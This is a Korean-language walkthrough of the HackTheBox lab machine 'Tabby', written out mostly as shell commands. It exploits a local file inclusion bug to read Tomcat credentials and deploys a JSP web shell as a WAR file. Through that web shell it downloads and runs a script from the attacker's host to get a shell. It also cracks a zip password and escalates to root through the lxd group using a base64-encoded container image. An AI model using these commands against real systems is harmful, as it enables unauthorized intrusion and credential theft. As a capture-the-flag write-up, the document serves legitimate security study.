# Tabby - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,8080 -sC -sV -vv -oA tabby 10.129.15.214
```
<img width="1104" height="521" alt="image" src="https://github.com/user-attachments/assets/01fe0140-c41d-4f7b-81b0-dda600839bb7" />

- SSH(22)
- HTTP(80)
- HTTP(8080)

---
## HTTP(8080)
### banner grabbing
<img width="1104" height="265" alt="image" src="https://github.com/user-attachments/assets/6cb85757-de94-4076-aba5-86856df09409" />

### tomcat
- `tomcat9`이 설치되었다는 것으로 확인.
- `manager webapp`과 `host-manager webapp` 링크를 클릭하여 `tomcat`의 기본 비밀번호로 로그인 시도하였으나 모두 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/0d0b366c-5a8c-4547-a794-747a527657f2" />

---
## HTTP(80)
### banner grabbing
<img width="1104" height="250" alt="image" src="https://github.com/user-attachments/assets/4356c59a-e05d-4a38-aaf9-c155d2a72823" />

### LFI
- `NEWS`탭의 url이 수상해보임.
<img width="677" height="122" alt="image" src="https://github.com/user-attachments/assets/7381e0f0-d827-474c-99ae-b23ff354e622" />

<br>
<br>

- `../../../../etc/passwd`로 `LFI`가 가능.
<img width="1890" height="229" alt="image" src="https://github.com/user-attachments/assets/da01ee8a-a89e-4f96-a28c-d62d2e64f2ea" />

<br>
<br>

- `8080`포트에서 `tomcat`이 실행 중이고 메인페이지에 적힌 `/var/lib/tomcat9/webapps/ROOT/index.html`로 요청이 가능.
```bash
curl 'http://10.129.16.62/news.php?file=../../../../var/lib/tomcat9/webapps/ROOT/index.html'
```
<img width="1104" height="353" alt="image" src="https://github.com/user-attachments/assets/e881e484-05f1-402f-ac55-7f796b6e4ca7" />

<br>
<br>

- `/etc/tomcat9/tomcat-users.xml`에 계정에 대한 정보가 있다고 적혀있으나 요청을 시도하였을 때는 실패.
- 검색했을 때 `/CATALINA_HOME/conf/tomcat-users.xml`가 존재한다고 되어 있으나 요청 실패.
- 여러 시도 끝에 `/usr/share/tomcat9/etc/tomcat-users.xml` 발견.
```bash
curl 'http://10.129.16.62/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml'
```
<img width="1104" height="217" alt="image" src="https://github.com/user-attachments/assets/c304e3fc-fa1d-414e-8f8a-53112ae07edd" />

<br>
<br>

- `host-manager webapp`에 `tomcat:$3cureP4s5w0rd123!`로 접속 가능.
- `manager webapp`이 아니라서 할 수 있는 것은 없음.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/501aa8e8-6a90-4f54-9213-d2a8f96e0698" />

<br>
<br>

- `/manager/text` 사용 시도.
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' 'http://10.129.16.62:8080/manager/text/list'
```
<img width="1104" height="163" alt="image" src="https://github.com/user-attachments/assets/da582496-d09f-44e5-b515-731e1ba9fa50" />

<br>
<br>

- `war`파일 업로드 시도.(재시작하여 주소가 조금 다름.)
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp

curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file backup.war 'http://10.129.16.63:8080/manager/text/deploy?path=/backup&update=true'
```
<img width="1104" height="446" alt="image" src="https://github.com/user-attachments/assets/4f22834b-97a3-4b9d-9b6d-a2986b4ac95f" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl 'http://10.129.16.63:8080/backup/cmd.jsp?cmd=id'
```
<img width="1104" height="297" alt="image" src="https://github.com/user-attachments/assets/aff3506b-479f-48f9-83cd-666d8a0250d4" />

<br>
<br>

- `ex.sh`생성
<img width="1105" height="83" alt="image" src="https://github.com/user-attachments/assets/6f878d36-b637-4b81-a796-c91eb34a5ec7" />

<br>
<br>

- 로컬로부터 다운로드 받아서 실행.
```bash
curl 'http://10.129.16.63:8080/backup/cmd.jsp?cmd=wget%20http%3A%2F%2F10.10.14.23%2Fex.sh%20-O%20%2Ftmp%2Fex.sh'

curl 'http://10.129.16.63:8080/backup/cmd.jsp?cmd=%2Fbin%2Fbash%20%2Ftmp%2Fex.sh'
```
<img width="1105" height="396" alt="image" src="https://github.com/user-attachments/assets/be0ab8e7-2619-4a69-85be-5ac15bdda601" />

<br>
<br>

- 셸 획득.
<img width="1105" height="179" alt="image" src="https://github.com/user-attachments/assets/8e0117cb-95c8-4a95-bdf1-d7922690da7f" />

---
## Privesc
- `/var/www/html/files`에서 `16162020_backup.zip` 발견.
<img width="1105" height="155" alt="image" src="https://github.com/user-attachments/assets/8d5cce63-0595-4c40-af3d-e597e114b5aa" />

<br>
<br>

- 로컬로 복사해서 압축 해제 시도하였으나 비밀번호가 걸려 있음.
<img width="1105" height="101" alt="image" src="https://github.com/user-attachments/assets/c032eff6-2d74-45ac-a0cc-ec400fb6c81e" />

<br>
<br>

- `zip2john`으로 해시화하여 크래킹.
```bash
zip2john remote_backup.zip >hash

john hash --wordlist=~/util/rockyou.txt

john hash --show
```
<img width="1105" height="120" alt="image" src="https://github.com/user-attachments/assets/8663c4a8-25ce-4c76-a858-7ad6dc51ee5d" />

<br>
<br>

- `admin@it`으로 압축 해제하여 내부 확인해보았으나 특별한 정보 발견하지 못함.
- `ash`유저 발견.
<img width="1105" height="64" alt="image" src="https://github.com/user-attachments/assets/78a7b039-daff-42e5-b4cd-3b100ace0b7c" />

<br>
<br>

- `ash:admin@it` 로그인.
<img width="1105" height="78" alt="image" src="https://github.com/user-attachments/assets/a467ad74-7160-4188-a01f-4edb8e5ba52b" />

<br>
<br>

- `lxd` 그룹.
<img width="1105" height="39" alt="image" src="https://github.com/user-attachments/assets/9057c4f0-0d5f-4972-95c6-46a6ce016e30" />

<br>
<br>

- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html?highlight=lxd#method-2
- https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1
```bash
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2

lxc image import bob.tar.bz2 --alias bobImage

lxc init bobImage bobVM -c security.privileged=true

lxc config device add bobVM realRoot disk source=/ path=r

lxc start bobVM

lxc exec bobVM -- /bin/sh
```
<img width="1105" height="402" alt="image" src="https://github.com/user-attachments/assets/3747a0ad-e08e-46d8-82dd-68a3373a786f" />

---
## FLAG
- `/home/ash/user.txt`
<img width="1105" height="251" alt="image" src="https://github.com/user-attachments/assets/d3ac106c-d798-4326-88b5-830ceb1f5404" />

<br>
<br>

- `/r/root/root.txt`
<img width="1105" height="251" alt="image" src="https://github.com/user-attachments/assets/f3f5f298-2433-4662-9cba-198cdcd96a4e" />
